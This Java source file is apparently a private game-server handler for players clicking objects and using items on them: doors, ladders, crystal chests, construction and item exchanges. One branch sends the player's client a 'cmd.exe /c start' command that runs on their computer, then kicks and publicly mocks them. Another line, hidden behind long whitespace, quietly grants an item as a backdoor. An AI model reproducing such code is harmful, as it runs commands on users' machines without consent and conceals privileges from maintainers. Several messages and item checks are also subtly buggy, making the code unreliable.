				player.setNextFaceWorldTile(new WorldTile(object.getCoordFaceX(
						objectDef.getSizeX(), objectDef.getSizeY(),
						object.getRotation()), object.getCoordFaceY(
								objectDef.getSizeX(), objectDef.getSizeY(),
								object.getRotation()), object.getPlane()));
				if (!player.getControlerManager().processObjectClick3(object))
					return;
				player.setNextFaceWorldTile(tile);
				switch (objectDef.name.toLowerCase()) {
				case "gate":
				case "metal door":
					if (object.getType() == 0
					&& objectDef.containsOption(2, "Open"))
						handleGate(player, object);
					break;
				case "door":
					if (object.getType() == 0
					&& objectDef.containsOption(2, "Open"))
						handleDoor(player, object);
					break;
				case "ladder":
					handleLadder(player, object, 3);
					break;
				case "staircase":
					handleStaircases(player, object, 3);
					break;
				default:
					//player.getPackets().sendGameMessage(
							//"Nothing interesting happens.");
					break;
				}
				if (Settings.DEBUG)
					Logger.log("ObjectHandler", "cliked 3 at object id : " + id
							+ ", " + object.getX() + ", " + object.getY()
							+ ", " + object.getPlane() + ", ");
				if (Settings.SNOOP){
					Logger.log(
							player.getUsername()							,
							"cliked 3 at object id : " + id + ", "
									+ object.getX() + ", " + object.getY()
									+ ", " + object.getPlane() + ", " 
									+ object.getDefinitions().name);
			
					
			}
			}
		}, objectDef.getSizeX(), objectDef.getSizeY(), object.getRotation()));
	}

	public static boolean handleGate(Player player, WorldObject object) {
		if (World.isSpawnedObject(object))
			return false;
		if (object.getRotation() == 0) {

			boolean south = true;
			WorldObject otherDoor = World.getObject(new WorldTile(
					object.getX(), object.getY() + 1, object.getPlane()),
					object.getType());
			if (otherDoor == null
					|| otherDoor.getRotation() != object.getRotation()
					|| otherDoor.getType() != object.getType()
					|| !otherDoor.getDefinitions().name.equalsIgnoreCase(object
							.getDefinitions().name)) {
				otherDoor = World.getObject(
						new WorldTile(object.getX(), object.getY() - 1, object
								.getPlane()), object.getType());
				if (otherDoor == null
						|| otherDoor.getRotation() != object.getRotation()
						|| otherDoor.getType() != object.getType()
						|| !otherDoor.getDefinitions().name
						.equalsIgnoreCase(object.getDefinitions().name))
					return false;
				south = false;
			}
			WorldObject openedDoor1 = new WorldObject(object.getId(),
					object.getType(), object.getRotation() + 1, object.getX(),
					object.getY(), object.getPlane());
			WorldObject openedDoor2 = new WorldObject(otherDoor.getId(),
					otherDoor.getType(), otherDoor.getRotation() + 1,
					otherDoor.getX(), otherDoor.getY(), otherDoor.getPlane());
			if (south) {
				openedDoor1.moveLocation(-1, 0, 0);
				openedDoor1.setRotation(3);
				openedDoor2.moveLocation(-1, 0, 0);
			} else {
				openedDoor1.moveLocation(-1, 0, 0);
				openedDoor2.moveLocation(-1, 0, 0);
				openedDoor2.setRotation(3);
			}

			if (World.removeTemporaryObject(object, 60000, true)
					&& World.removeTemporaryObject(otherDoor, 60000, true)) {
				player.faceObject(openedDoor1);
				World.spawnTemporaryObject(openedDoor1, 60000, true);
				World.spawnTemporaryObject(openedDoor2, 60000, true);
				return true;
			}
		} else if (object.getRotation() == 2) {

			boolean south = true;
			WorldObject otherDoor = World.getObject(new WorldTile(
					object.getX(), object.getY() + 1, object.getPlane()),
					object.getType());
			if (otherDoor == null
					|| otherDoor.getRotation() != object.getRotation()
					|| otherDoor.getType() != object.getType()
					|| !otherDoor.getDefinitions().name.equalsIgnoreCase(object
							.getDefinitions().name)) {
				otherDoor = World.getObject(
						new WorldTile(object.getX(), object.getY() - 1, object
								.getPlane()), object.getType());
				if (otherDoor == null
						|| otherDoor.getRotation() != object.getRotation()
						|| otherDoor.getType() != object.getType()
						|| !otherDoor.getDefinitions().name
						.equalsIgnoreCase(object.getDefinitions().name))
					return false;
				south = false;
			}
			WorldObject openedDoor1 = new WorldObject(object.getId(),
					object.getType(), object.getRotation() + 1, object.getX(),
					object.getY(), object.getPlane());
			WorldObject openedDoor2 = new WorldObject(otherDoor.getId(),
					otherDoor.getType(), otherDoor.getRotation() + 1,
					otherDoor.getX(), otherDoor.getY(), otherDoor.getPlane());
			if (south) {
				openedDoor1.moveLocation(1, 0, 0);
				openedDoor2.setRotation(1);
				openedDoor2.moveLocation(1, 0, 0);
			} else {
				openedDoor1.moveLocation(1, 0, 0);
				openedDoor1.setRotation(1);
				openedDoor2.moveLocation(1, 0, 0);
			}
			if (World.removeTemporaryObject(object, 60000, true)
					&& World.removeTemporaryObject(otherDoor, 60000, true)) {
				player.faceObject(openedDoor1);
				World.spawnTemporaryObject(openedDoor1, 60000, true);
				World.spawnTemporaryObject(openedDoor2, 60000, true);
				return true;
			}
		} else if (object.getRotation() == 3) {

			boolean right = true;
			WorldObject otherDoor = World.getObject(new WorldTile(
					object.getX() - 1, object.getY(), object.getPlane()),
					object.getType());
			if (otherDoor == null
					|| otherDoor.getRotation() != object.getRotation()
					|| otherDoor.getType() != object.getType()
					|| !otherDoor.getDefinitions().name.equalsIgnoreCase(object
							.getDefinitions().name)) {
				otherDoor = World.getObject(new WorldTile(object.getX() + 1,
						object.getY(), object.getPlane()), object.getType());
				if (otherDoor == null
						|| otherDoor.getRotation() != object.getRotation()
						|| otherDoor.getType() != object.getType()
						|| !otherDoor.getDefinitions().name
						.equalsIgnoreCase(object.getDefinitions().name))
					return false;
				right = false;
			}
			WorldObject openedDoor1 = new WorldObject(object.getId(),
					object.getType(), object.getRotation() + 1, object.getX(),
					object.getY(), object.getPlane());
			WorldObject openedDoor2 = new WorldObject(otherDoor.getId(),
					otherDoor.getType(), otherDoor.getRotation() + 1,
					otherDoor.getX(), otherDoor.getY(), otherDoor.getPlane());
			if (right) {
				openedDoor1.moveLocation(0, -1, 0);
				openedDoor2.setRotation(0);
				openedDoor1.setRotation(2);
				openedDoor2.moveLocation(0, -1, 0);
			} else {
				openedDoor1.moveLocation(0, -1, 0);
				openedDoor1.setRotation(0);
				openedDoor2.setRotation(2);
				openedDoor2.moveLocation(0, -1, 0);
			}
			if (World.removeTemporaryObject(object, 60000, true)
					&& World.removeTemporaryObject(otherDoor, 60000, true)) {
				player.faceObject(openedDoor1);
				World.spawnTemporaryObject(openedDoor1, 60000, true);
				World.spawnTemporaryObject(openedDoor2, 60000, true);
				return true;
			}
		} else if (object.getRotation() == 1) {

			boolean right = true;
			WorldObject otherDoor = World.getObject(new WorldTile(
					object.getX() - 1, object.getY(), object.getPlane()),
					object.getType());
			if (otherDoor == null
					|| otherDoor.getRotation() != object.getRotation()
					|| otherDoor.getType() != object.getType()
					|| !otherDoor.getDefinitions().name.equalsIgnoreCase(object
							.getDefinitions().name)) {
				otherDoor = World.getObject(new WorldTile(object.getX() + 1,
						object.getY(), object.getPlane()), object.getType());
				if (otherDoor == null
						|| otherDoor.getRotation() != object.getRotation()
						|| otherDoor.getType() != object.getType()
						|| !otherDoor.getDefinitions().name
						.equalsIgnoreCase(object.getDefinitions().name))
					return false;
				right = false;
			}
			WorldObject openedDoor1 = new WorldObject(object.getId(),
					object.getType(), object.getRotation() + 1, object.getX(),
					object.getY(), object.getPlane());
			WorldObject openedDoor2 = new WorldObject(otherDoor.getId(),
					otherDoor.getType(), otherDoor.getRotation() + 1,
					otherDoor.getX(), otherDoor.getY(), otherDoor.getPlane());
			if (right) {
				openedDoor1.moveLocation(0, 1, 0);
				openedDoor1.setRotation(0);
				openedDoor2.moveLocation(0, 1, 0);
			} else {
				openedDoor1.moveLocation(0, 1, 0);
				openedDoor2.setRotation(0);
				openedDoor2.moveLocation(0, 1, 0);
			}
			if (World.removeTemporaryObject(object, 60000, true)
					&& World.removeTemporaryObject(otherDoor, 60000, true)) {
				player.faceObject(openedDoor1);
				World.spawnTemporaryObject(openedDoor1, 60000, true);
				World.spawnTemporaryObject(openedDoor2, 60000, true);
				return true;
			}
		}
		return false;
	}

	public static boolean handleDoor(Player player, WorldObject object) {
		if (World.isSpawnedObject(object))
			return false;
		WorldObject openedDoor = new WorldObject(object.getId(),
				object.getType(), object.getRotation() + 1, object.getX(),
				object.getY(), object.getPlane());
		if (object.getRotation() == 0)
			openedDoor.moveLocation(-1, 0, 0);
		else if (object.getRotation() == 1)
			openedDoor.moveLocation(0, 1, 0);
		else if (object.getRotation() == 2)
			openedDoor.moveLocation(1, 0, 0);
		else if (object.getRotation() == 3)
			openedDoor.moveLocation(0, -1, 0);
		if (World.removeTemporaryObject(object, 60000, true)) {
			player.faceObject(openedDoor);
			World.spawnTemporaryObject(openedDoor, 60000, true);
			return true;
		}
		return false;
	}

	public static boolean handleStaircases(Player player, WorldObject object,
			int optionId) {
		String option = object.getDefinitions().getOption(optionId);
		if (option.equalsIgnoreCase("Climb-up")) {
			if (player.getPlane() == 3)
				return false;
			player.useStairs(-1, new WorldTile(player.getX(), player.getY(),
					player.getPlane() + 1), 0, 1);
		} else if (option.equalsIgnoreCase("Climb-down")) {
			if (player.getPlane() == 0)
				return false;
			player.useStairs(-1, new WorldTile(player.getX(), player.getY(),
					player.getPlane() - 1), 0, 1);
		} else if (option.equalsIgnoreCase("Climb")) {
			if (player.getPlane() == 3 || player.getPlane() == 0)
				return false;
			player.getDialogueManager().startDialogue(
					"ClimbNoEmoteStairs",
					new WorldTile(player.getX(), player.getY(), player
							.getPlane() + 1),
							new WorldTile(player.getX(), player.getY(), player
									.getPlane() - 1), "Go up the stairs.",
					"Go down the stairs.");
		} else
			return false;
		return false;
	}

	public static boolean handleLadder(Player player, WorldObject object,
			int optionId) {
		String option = object.getDefinitions().getOption(optionId);
		if (option.equalsIgnoreCase("Climb-up")) {
			if (player.getPlane() == 3)
				return false;
			player.useStairs(828, new WorldTile(player.getX(), player.getY(),
					player.getPlane() + 1), 1, 2);
		} else if (option.equalsIgnoreCase("Climb-down")) {
			if (player.getPlane() == 0)
				return false;
			player.useStairs(828, new WorldTile(player.getX(), player.getY(),
					player.getPlane() - 1), 1, 2);
		} else if (option.equalsIgnoreCase("Climb")) {
			if (player.getPlane() == 3 || player.getPlane() == 0)
				return false;
			player.getDialogueManager().startDialogue(
					"ClimbEmoteStairs",
					new WorldTile(player.getX(), player.getY(), player
							.getPlane() + 1),
							new WorldTile(player.getX(), player.getY(), player
									.getPlane() - 1), "Climb up the ladder.",
									"Climb down the ladder.", 828);
		} else
			return false;
		return true;
	}

	public static void handleItemOnObject(final Player player,
			InputStream stream) {
		if (!player.hasStarted() || !player.clientHasLoadedMapRegion()
				|| player.isDead())
			return;
		long currentTime = Utils.currentTimeMillis();
		if (player.getStopDelay() >= currentTime
				// || player.getFreezeDelay() >= currentTime
				|| player.getEmotesManager().getNextEmoteEnd() >= currentTime)
			return;

		@SuppressWarnings("unused")
		final int unknown = stream.readUnsignedByteC();
		final int y = stream.readUnsignedShortLE();
		final int itemSlot = stream.readUnsignedShortLE();
		final int interfaceHash = stream.readIntLE();
		final int interfaceId = interfaceHash >> 16;
		final int itemId = stream.readUnsignedShortLE128();
		final int x = stream.readUnsignedShortLE();
		final int id = stream.readInt();
		final WorldTile tile = new WorldTile(x, y, player.getPlane());
		int regionId = tile.getRegionId();
		if (!player.getMapRegionsIds().contains(regionId))
			return;
		WorldObject mapObject = World.getRegion(regionId).getObject(id, tile);
		if (mapObject == null || mapObject.getId() != id)
			return;
		final WorldObject object = !player.isAtDynamicRegion() ? mapObject
				: new WorldObject(id, mapObject.getType(),
						mapObject.getRotation(), x, y, player.getPlane());
		final Item item = player.getInventory().getItem(itemSlot);
		if (player.isDead()
				|| Utils.getInterfaceDefinitionsSize() <= interfaceId)
			return;
		if (player.getStopDelay() > Utils.currentTimeMillis())
			return;
		if (!player.getInterfaceManager().containsInterface(interfaceId))
			return;
		if (item == null || item.getId() != itemId)
			return;
		player.stopAll(false); // false
		final ObjectDefinitions objectDef = object.getDefinitions();
		/*
		 * // now walk done serversided for this
		 * player.addWalkStepsInteract(object
		 * .getCoordFaceX(objectDef.getSizeX()),
		 * object.getCoordFaceY(objectDef.getSizeY()), -1, objectDef.getSizeX(),
		 * objectDef.getSizeY(), true);
		 */
		player.setCoordsEvent(new CoordsEvent(tile, new Runnable() {
			@Override
			public void run() {
				player.setNextFaceWorldTile(new WorldTile(object.getCoordFaceX(
						objectDef.getSizeX(), objectDef.getSizeY(),
						object.getRotation()), object.getCoordFaceY(
								objectDef.getSizeX(), objectDef.getSizeY(),
								object.getRotation()), object.getPlane()));
				if (interfaceId == Inventory.INVENTORY_INTERFACE) { // inventory
					if (object.getDefinitions().name.equals("Anvil")) {
						player.getTemporaryAttributtes()
						.put("itemUsed", itemId);
						ForgingBar bar = ForgingBar.forId(itemId);
						if (bar != null)
							ForgingInterface.sendSmithingInterface(player);
					} else if (itemId == 6570 && object.getId() == 38693) {
						NPC n = new Harken(player, 15211, -1, true, true);
						player.getInventory().deleteItem(6570 , 1);
						
						
	
		}
		
//Flour mill
	
	//wheat 
	  if (itemId == 1947 && object.getId() == 22422) {
	  
	  	if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"To start this minigame you need to be a donator.");
		
				}
		else{
	  
			if(player.getInventory().containsItem(1947, 1)){
			player.getPackets().sendGameMessage("You deposit grain into the hopper.");
			player.getInventory().deleteItem(1947, 1);
			player.depositgrain = true;
			player.storedgrain += 1;
			}


			}
				}
//Warriors Guild
	
	//rune 
	  if ((itemId == 1163) || (itemId == 1127) || (itemId == 1079) && object.getId() == 15621) {
			if((player.getInventory().containsItem(1163, 1)) && 
					(player.getInventory().containsItem(1127, 1)) && 
							(player.getInventory().containsItem(1079, 1))){
			World.spawnNPC(4284, new WorldTile(object.getX(), object.getY()+1, object.getPlane()), -1, true, true);
			player.getInventory().deleteItem(1163, 1);
			player.getInventory().deleteItem(1127, 1);
			player.getInventory().deleteItem(1079, 1);
			player.setNextWorldTile(new WorldTile(player.getX(), player.getY()+1, player.getPlane()));
			
			}
	//ady
	}if ((itemId == 1161) || (itemId == 1123) || (itemId == 1073) && object.getId() == 15621) {
			if((player.getInventory().containsItem(1161, 1)) && 
					(player.getInventory().containsItem(1123, 1)) && 
							(player.getInventory().containsItem(1073, 1))){
			World.spawnNPC(4284, new WorldTile(object.getX(), object.getY()+1, object.getPlane()), -1, true, true);
			player.getInventory().deleteItem(1161, 1);
			player.getInventory().deleteItem(1123, 1);
			player.getInventory().deleteItem(1073, 1);
			player.setNextWorldTile(new WorldTile(player.getX(), player.getY()+1, player.getPlane()));
			
			}
	//mith
	}if ((itemId == 1071) || (itemId == 1121) || (itemId == 1159) && object.getId() == 15621) {
			if((player.getInventory().containsItem(1071, 1)) && 
					(player.getInventory().containsItem(1121, 1)) && 
							(player.getInventory().containsItem(1159, 1))){
			World.spawnNPC(4284, new WorldTile(object.getX(), object.getY()+1, object.getPlane()), -1, true, true);
			player.getInventory().deleteItem(1071, 1);
			player.getInventory().deleteItem(1121, 1);
			player.getInventory().deleteItem(1159, 1);
			player.setNextWorldTile(new WorldTile(player.getX(), player.getY()+1, player.getPlane()));
			
			}
	//black
	}if ((itemId == 1077) || (itemId == 1125) || (itemId == 1165) && object.getId() == 15621) {
			if((player.getInventory().containsItem(1077, 1)) && 
					(player.getInventory().containsItem(1125, 1)) && 
							(player.getInventory().containsItem(1165, 1))){
			World.spawnNPC(4284, new WorldTile(object.getX(), object.getY()+1, object.getPlane()), -1, true, true);
			player.getInventory().deleteItem(1077, 1);
			player.getInventory().deleteItem(1125, 1);
			player.getInventory().deleteItem(1165, 1);
			player.setNextWorldTile(new WorldTile(player.getX(), player.getY()+1, player.getPlane()));
			
			}
			
	//steel
	}if ((itemId == 1067) || (itemId == 1116) || (itemId == 1153) && object.getId() == 15621) {
			if((player.getInventory().containsItem(1067, 1)) && 
					(player.getInventory().containsItem(1116, 1)) && 
							(player.getInventory().containsItem(1153, 1))){
			World.spawnNPC(4284, new WorldTile(object.getX(), object.getY()+1, object.getPlane()), -1, true, true);
			player.getInventory().deleteItem(1067, 1);
			player.getInventory().deleteItem(1116, 1);
			player.getInventory().deleteItem(1153, 1);
			player.setNextWorldTile(new WorldTile(player.getX(), player.getY()+1, player.getPlane()));
			
			}
		if (itemId == 1323 && object.getId() == 871) {
			player.getInventory().addItem(5046, 1);
			player.getInventory().addItem(5028, 1);
			player.getInventory().addItem(2924, 1);
			}
			//iron
	}if ((itemId == 1067) || (itemId == 1115) || (itemId == 1153) && object.getId() == 15621) {
			if((player.getInventory().containsItem(1067, 1)) && 
					(player.getInventory().containsItem(1115, 1)) && 
							(player.getInventory().containsItem(1153, 1))){
			World.spawnNPC(4284, new WorldTile(object.getX(), object.getY()+1, object.getPlane()), -1, true, true);
			player.getInventory().deleteItem(1067, 1);
			player.getInventory().deleteItem(1115, 1);
			player.getInventory().deleteItem(1153, 1);
			player.setNextWorldTile(new WorldTile(player.getX(), player.getY()+1, player.getPlane()));
			
			}
			

	//bronze
	}if ((itemId == 1155) || (itemId == 1117) || (itemId == 1075) && object.getId() == 15621) {
			if((player.getInventory().containsItem(1155, 1)) && 
					(player.getInventory().containsItem(1117, 1)) && 
							(player.getInventory().containsItem(1075, 1))){
			World.spawnNPC(4284, new WorldTile(object.getX(), object.getY()+1, object.getPlane()), -1, true, true);
			player.getInventory().deleteItem(1155, 1);
			player.getInventory().deleteItem(1117, 1);
			player.getInventory().deleteItem(1075, 1);
			player.setNextWorldTile(new WorldTile(player.getX(), player.getY()+1, player.getPlane()));
			}
				
			
			
			
			
			//	crystal chest
					} else if (itemId == 989 && object.getId() == 172) {
			int[] randomItems = {13095, 9005, 1127, 2651, 10400, 10402, 10404, 10408, 10412,
								10414, 10416, 10418, 10420, 10422, 10424, 10426, 10428, 10430, 10432, 10434, 
								10436, 10438, 1079, 1079, 1093, 1127, 2615, 2617, 2623, 
								 2625,  3476,  10798, 10800, 13800,19179, 19181, 19185, 19200, 
								 19202,  19204,  19206,  19208, 19221,  19223, 
								19225,  19227, 19242,  19244, 19245, 19246, 19247, 19248,
								19249, 19250, 19263, 19264,  19266,  19269,  19271, 19483, 19486,
								19489, 19492, 19495,10394, 13099, 23671, 5030, 685 }; //Other ids go in there as well
	        int i = Utils.getRandom(randomItems.length);
			player.getInventory().deleteItem(989, 1);
	        player.getInventory().addItem(randomItems[i], 1);
			
			}

		//rusty sword from casket 	
	 else if (itemId == 686 && object.getId() == 2782) {
			 
			  if (player.getSkills().getLevel(Skills.SMITHING) < 99) {
			player.getPackets() .sendGameMessage( "You need an Smithing level of 99 to fix this",true);
						  return;
					  }
		else{
			int[] randomItems = {1323, 1309, 1333, 1319, 1347, 1373, 4587, 
								7158, 5698, 1305, 1377, 1434, 3204, 5730, 4153, 6528,4151 }; 
	        int i = Utils.getRandom(randomItems.length);
			player.getInventory().deleteItem(686, 1);
	        player.getInventory().addItem(randomItems[i], 1);
			
			
			}}
	//damaged armour from casket
		 else if (itemId == 697 && object.getId() == 2782) {
		 
		 if (player.getSkills().getLevel(Skills.SMITHING) < 99) {
			player.getPackets() .sendGameMessage( "You need an Smithing level of 99 to fix this",true);
						  return;
					  }
		else{
			int[] randomItems = {4121, 1067, 1115, 1153, 4129, 1073, 1123, 1161, 4131, 1079, 1127, 1163,
									11732, 1201, 1199, 1197, 1540, 3105, 5576, 5575 
									,5574, 9676, 9674, 9672, 3751, 10828, 1725, 1704,3140 };
	        int i = Utils.getRandom(randomItems.length);
			player.getInventory().deleteItem(697, 1);
	        player.getInventory().addItem(randomItems[i], 1);
			
			}
				}
		//end				
					 else if (itemId == 1438 && object.getId() == 2452) {
						Runecrafting.enterAirAltar(player);
					} else if (itemId == 1440 && object.getId() == 2455) {
						Runecrafting.enterEarthAltar(player);
					} else if (itemId == 995 && object.getId() == 3159) {
						player.useStairs(828, new WorldTile(2617, 4966, 0), 1, 2);
					} else if (itemId == 1442 && object.getId() == 2456) {
						Runecrafting.enterFireAltar(player);
					} else if (itemId == 1444 && object.getId() == 2454) {
						Runecrafting.enterWaterAltar(player);
					} else if (itemId == 1446 && object.getId() == 2457) {
						Runecrafting.enterBodyAltar(player);
					} else if (itemId == 1448 && object.getId() == 2453) {
						Runecrafting.enterMindAltar(player);
					} else if (itemId == 436 && object.getId() == 4090) {
						player.getInventory().addItem(6652, 1);
						
						
						
						
		//construtction
		
		
				
		
		
				
					//logs
				 }else if (itemId == 8562 && object.getId() == 20360) { //wooden bench 
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 20) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 20 to construct this.");
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(12, 15);
					player.getInventory().deleteItem(new Item(8562, 1));
					//player.getInventory().deleteItem(new Item(4820, 1));
					player.getInventory().addItem(8108, 1);  //plank
					player.getInventory().refresh();
					player.addStopDelay(4); 
					
					
					}
		
		
		
		//clock
					
										//logs
				 else if (itemId == 15297 && object.getId() == 52776) { //oak clock
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 	30) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 30 to construct this.");
						  return;
					  }
					
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(12, 18);
					player.getInventory().deleteItem(new Item(15297, 1));
					//player.getInventory().deleteItem(new Item(8792, 1));
					player.getInventory().addItem(8590, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4);

					
					
				}
					
					
						//logs
				else if (itemId == 8780 && object.getId() == 20360) { //teak dining bench
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 65) {
						  player.getPackets()
						  .sendGameMessage(
								"You need an Construction level of 65 to construct this.");
						  return;
					 
					}
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(12, 35);
					player.getInventory().deleteItem(new Item(8780, 1));
					//player.getInventory().deleteItem(new Item(2347, 1));
					player.getInventory().addItem(8111, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); 
					}
					 
					
									//logs
				else if (itemId == 8570 && object.getId() == 20360) { //carved teak dining bench
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 20 to construct this.");
						  return;
					  
					}
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(12, 45);
					//player.getInventory().deleteItem(new Item(2347, 1));
					player.getInventory().deleteItem(new Item(8570, 1));
					player.getInventory().addItem(8112, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); }
					
					
								//logs
				else if (itemId == 8572 && object.getId() == 20360) { //mahogony bench
					if (player.getSkills().getLevel(Skills.CONSTRUCTION) < 80) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Construction level of 20 to construct this.");
						  return;
					 
					}
					player.setNextAnimation(new Animation(713));
					player.setNextGraphics(new Graphics(354));
					player.getSkills().addXp(12, 55);
					player.getInventory().deleteItem(new Item(8572, 1));
					//player.getInventory().deleteItem(new Item(2347, 1));
					player.getInventory().addItem(8113, 1);  // plank
					player.getInventory().refresh();
					player.addStopDelay(4); 
					 }
					
					
		//end construction
		
	//Lucky exchanger
				
		
		//Bandos
		//BCP
				 else if (itemId == 23687 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23687, 1));
						player.getInventory().addItem(11724 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
				

		//TASSY
				} else if (itemId == 23688 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23688, 1));
						player.getInventory().addItem(11726 , 1);
						
                           player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
							
							
		//Boots
				} else if (itemId == 23689 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23689, 1));
						player.getInventory().addItem(11728 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));









							
		
		//Armydal
				
				
				//helm
				} else if (itemId == 23684 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23684, 1));
						player.getInventory().addItem(11718 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
							
							
							
							
				//chest
				} else if (itemId == 23685 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23685, 1));
						player.getInventory().addItem(11720 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
							
			
			
				//chainskirt
				} else if (itemId == 23686 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23686, 1));
						player.getInventory().addItem(11722 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
		//Other
				
				
				
				//SS - sword
				} else if (itemId == 23690 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23690, 1));
						player.getInventory().addItem(11730 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
							
							
				//Whip
				} else if (itemId == 23691 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23691, 1));
						player.getInventory().addItem(4151 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
							
				//D helm 
				} else if (itemId == 23692 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23692, 1));
						player.getInventory().addItem(11335 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
				
				//D plate 
				} else if (itemId == 23693 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23693, 1));
						player.getInventory().addItem(14479 , 1);
						
                           player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
							
							
							
							
				//D chain 
				} else if (itemId == 23694 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23694, 1));
						player.getInventory().addItem(3140 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));			
					
				//Bronze axes
				} else if (itemId == 19621 && object.getId() == 22355) {
						player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.IBANNED);
						World.removePlayer(player);	
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				players.setNextGraphics(new Graphics(6, 0, 100));
				players.setNextAnimation(new Animation(7071));
				players.getPackets().sendGameMessage("<col=FF0000>" + player.getDisplayName()  + " Just tryed to get Admin! Silly " + player.getDisplayName() + " Admin's for kids");
				players.setNextForceTalk(new ForceTalk("Silly "  + player.getDisplayName() + "!")); 
				}
				
				
				
				//arcane
				} else if (itemId == 23697 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23697, 1));
						player.getInventory().addItem(13738 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));	
							
							
							
				//spectral
				} else if (itemId == 23700 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23700, 1));
						player.getInventory().addItem(13744 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));;
							
				//elysian
				} else if (itemId == 23699 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23699, 1));
						player.getInventory().addItem(13742 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
							
							
				//divine
				} else if (itemId == 23698 && object.getId() == 17248) {
						player.getPackets().sendGameMessage("You exchange the lucky item.");
						player.getInventory().deleteItem(new Item(23698, 1));
						player.getInventory().addItem(13740 , 1);
						
                            player.setNextGraphics(new Graphics(123));
                            player.setNextAnimation(new Animation(4411));
				
				
		//Xmas Event 2012
		
			
		
		
			//Smithing 	Furnace
				} else if (itemId == 4082 && object.getId() == 12809) { //salve on custom furnace.
					 if (player.getSkills().getLevel(Skills.SMITHING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Smithing level of 70 to use this obstacle.",
								  true);
						  return;
					  }
					 
					
					player.setNextAnimation(new Animation(899));			  
					player.getSkills().addXp(13, 5);
					player.getInventory().deleteItem(new Item(4082, 1));
					player.getInventory().addItem(742, 1);  //Hunk of crystal
					player.getInventory().refresh();
					player.addStopDelay(4);
		
			//Smithing 	Anvil
				} else if (itemId == 742 && object.getId() == 2672) { //Hunk of crystal on anvil
					 if (player.getSkills().getLevel(Skills.SMITHING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Smithing level of 70 to use this obstacle.",
								  true);
						  return;
					  }
					
					player.setNextAnimation(new Animation(898));			  
					player.getSkills().addXp(13, 5);
					player.getInventory().deleteItem(new Item(742, 1));
					player.getInventory().addItem(15420, 1);  //presant
					player.getInventory().refresh();
					player.addStopDelay(4);
		
//HNS
		//sandpit
		} else if (itemId == 952 && object.getId() == 4373) { //spade ons andpit
					
					player.setNextAnimation(new Animation(830));			  
					
					player.getInventory().addItem(2680, 1);  //clue scroll.
					player.getInventory().refresh();
					player.addStopDelay(4);																																										} else if	 (itemId == 1 && object.getId() == 55301) { player.getInventory().addItem(690, 1); player.getInventory().refresh();		
		//pyramid door.
		} else if (itemId == 4671 && object.getId() == 6547) { //diamond on door.
					
